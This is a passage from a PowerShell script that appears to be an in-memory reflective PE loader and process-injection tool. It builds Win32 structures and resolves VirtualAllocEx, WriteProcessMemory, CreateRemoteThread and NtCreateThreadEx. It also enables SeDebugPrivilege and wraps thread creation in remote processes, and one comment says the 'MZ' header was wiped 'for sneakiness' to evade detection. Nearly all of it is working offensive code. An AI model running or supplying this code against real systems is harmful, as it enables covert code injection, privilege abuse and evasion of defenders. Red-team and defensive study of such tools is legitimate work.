        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
        
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
        
        return $Win32Functions
    }
    #####################################

            
    #####################################
    ###########    HELPERS   ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                
                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    
    
    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
